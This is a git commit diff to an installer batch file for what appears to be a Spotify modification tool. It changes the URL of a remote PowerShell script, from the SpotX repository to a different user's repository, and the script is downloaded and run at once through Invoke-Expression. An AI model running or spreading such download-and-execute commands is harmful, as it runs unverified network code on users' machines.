33a8eec4c37116d884ba888c1960a545ebc68fe6
chloe <74093045+chloeS2@users.noreply.github.com>
2022-07-31 13:13:33 -0300

    Update Install.bat

--- Install.bat
+++ Install.bat
@@ -1,6 +1,6 @@
 @echo off
 
-powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}"; "& {(Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/amd64fox/SpotX/main/Install.ps1').Content | Invoke-Expression}"
+powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}"; "& {(Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/chloeS2/InsSpotify/main/Install.ps1').Content | Invoke-Expression}"
 
 pause
 exit /b
